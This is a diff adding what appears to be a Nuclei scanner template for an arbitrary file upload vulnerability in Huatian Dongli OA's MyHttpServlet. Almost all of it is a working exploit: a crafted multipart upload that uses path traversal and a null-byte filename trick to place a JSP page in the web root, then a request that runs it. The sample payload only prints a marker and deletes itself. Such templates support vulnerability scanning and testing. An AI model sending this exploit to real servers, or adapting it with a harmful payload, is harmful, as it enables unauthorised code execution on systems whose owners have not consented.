@@ -1,0 +1,38 @@
+id: huatiandongli-myhttpservlet-fileupload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 华天动力 MyHttpServlet 任意文件上传
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzNjYwODg3Ng==&mid=2247484255&idx=1&sn=593fb55af1dc091ae6a4e94de018dbc2
+  tags: huatian,huatiandongli,fileupload
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{rand_base(8)}}"
+http:
+  - raw:
+      - |-
+        POST /OAapp/MyHttpServlet?username=admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+        Content-Length: 193
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="../../../../../../webapps/ROOT/{{filename}}.jsp%00.jpg
+
+        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM="))); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundary{{boundary}}--
+      - |+
+        GET /{{filename}}.jsp;.html HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba03099a1c0393373c5b43'
